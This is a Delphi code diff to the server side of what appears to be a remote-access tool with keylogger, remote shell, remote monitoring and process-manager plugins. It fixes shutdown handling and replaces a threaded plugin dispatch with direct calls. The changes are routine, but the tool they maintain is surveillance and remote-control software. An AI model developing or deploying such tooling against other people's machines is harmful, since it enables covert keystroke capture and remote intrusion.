@@ -81,6 +81,7 @@ type
     FKeyloggerForms   : TDictionary<TncLine, TForm7>;
     FReadBuffers      : TDictionary<TncLine, TBytes>;
     FHeartbeatTimer   : TTimer;
+    FIsStopping       : Boolean;
 
     FOnClientConnected    : TClientEvent;
     FOnClientUpdated      : TClientEvent;
@@ -194,6 +195,7 @@ end;
 constructor TServerManager.Create(aServer: TncTCPServer);
 begin
   inherited Create;
+  FIsStopping       := False;
   FServer           := aServer;
   FLock             := TCriticalSection.Create;
   FClients          := TDictionary<TncLine, TClientInfo>.Create;
@@ -245,10 +247,24 @@ end;
 
 procedure TServerManager.Stop;
 begin
+  FIsStopping := True;
   FHeartbeatTimer.Enabled := False;
+  FHeartbeatTimer.OnTimer := nil;
+
   FServer.OnConnected    := nil;
   FServer.OnDisconnected := nil;
   FServer.OnReadData     := nil;
+
+  FOnClientConnected    := nil;
+  FOnClientUpdated      := nil;
+  FOnClientDisconnected := nil;
+  FOnInfoReceived       := nil;
+  FOnProcessReceived    := nil;
+  FOnRemoteShellReceived:= nil;
+  FOnMonitoringReceived := nil;
+  FOnKeyloggerReceived  := nil;
+  FOnLog                := nil;
+
   if FServer.Active then
     FServer.Active := False;
 end;
@@ -787,7 +803,7 @@ var
   Messages     : TList<string>;
   BinaryFrames : TList<TBytes>;
 begin
-  if aBufCount <= 0 then
+  if (aBufCount <= 0) then
     Exit;
 
   Messages     := TList<string>.Create;
@@ -795,6 +811,7 @@ begin
   try
     FLock.Enter;
     try
+      if FIsStopping then Exit;
       if not FReadBuffers.TryGetValue(aLine, Buffer) then
         SetLength(Buffer, 0);
 
@@ -955,24 +972,18 @@ begin
       if PluginID <> '' then
       begin
         DoLog(lcCommand, '"' + PluginID + '" requested by ' + IP);
-        var CapturedLine     := aLine;
-        var CapturedPluginID := PluginID;
-        var Self_            := Self;
-        TThread.CreateAnonymousThread(procedure
-        begin
-          if SameText(CapturedPluginID, INFORMATION_PLUGIN_ID) then
-            Self_.SendInformationPlugin(CapturedLine)
-          else if SameText(CapturedPluginID, PROCESS_MANAGER_PLUGIN_ID) then
-            Self_.SendProcessManagerPlugin(CapturedLine)
-          else if SameText(CapturedPluginID, REMOTE_SHELL_PLUGIN_ID) then
-            Self_.SendRemoteShellPlugin(CapturedLine)
-          else if SameText(CapturedPluginID, REMOTE_MONITORING_PLUGIN_ID) then
-            Self_.SendRemoteMonitoringPlugin(CapturedLine)
-          else if SameText(CapturedPluginID, KEYLOGGER_PLUGIN_ID) then
-            Self_.SendKeyloggerPlugin(CapturedLine)
-          else
-            Self_.SendPlugin(CapturedLine, CapturedPluginID);
-        end).Start;
+        if SameText(PluginID, INFORMATION_PLUGIN_ID) then
+          SendInformationPlugin(aLine)
+        else if SameText(PluginID, PROCESS_MANAGER_PLUGIN_ID) then
+          SendProcessManagerPlugin(aLine)
+        else if SameText(PluginID, REMOTE_SHELL_PLUGIN_ID) then
+          SendRemoteShellPlugin(aLine)
+        else if SameText(PluginID, REMOTE_MONITORING_PLUGIN_ID) then
+          SendRemoteMonitoringPlugin(aLine)
+        else if SameText(PluginID, KEYLOGGER_PLUGIN_ID) then
+          SendKeyloggerPlugin(aLine)
+        else
+          SendPlugin(aLine, PluginID);
       end;
       Exit;
     end;
